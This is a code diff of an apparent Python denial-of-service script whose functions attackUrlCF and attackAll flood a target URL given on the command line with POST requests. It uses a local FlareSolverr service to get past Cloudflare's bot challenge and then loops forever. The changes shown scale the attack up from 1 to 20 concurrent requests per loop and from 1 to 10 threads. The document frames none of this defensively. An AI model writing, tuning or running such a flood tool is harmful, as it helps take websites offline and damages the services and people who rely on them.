@@ -88,7 +88,7 @@ def solveChanellnge(url):
 
 
 def attackUrlCF(baseUrl, threadNumber):	
-	url, cookiesStr, userAgent, proxies = solveChanellnge(baseUrl)
+	# url, cookiesStr, userAgent, proxies = solveChanellnge(baseUrl)
 
 	while True:
 		try:
@@ -108,7 +108,7 @@ def attackUrlCF(baseUrl, threadNumber):
 			}
 
 			requestsArr = []
-			for x in range(1):
+			for x in range(20):
 				requestsArr.append(grequests.post(url, headers=headers, data=data))
 			#res = requests.post(url, headers=headers, proxies=proxies, data=postData.replace('REPLACE', str(random.randint(0,99999))))
 			res = grequests.map(requestsArr, exception_handler=my_handler)
@@ -116,6 +116,7 @@ def attackUrlCF(baseUrl, threadNumber):
 			
 			if str(res[0].status_code) in ['404']:
 				print(str(threadNumber), 'moved!!!! resolsing chalennge', res[0].content)
+				input()
 				url, cookiesStr, userAgent, proxies = solveChanellnge(baseUrl)
 				print(str(threadNumber), 'resolved')
 			
@@ -131,7 +132,7 @@ def attackAll():
 
 flareSolverUrl = 'http://localhost:8191/v1'
 
-for i in range(1):
+for i in range(10):
 	Thread(target=attackUrlCF, args=[sys.argv[1], i]).start()
 	time.sleep(30)
 input()
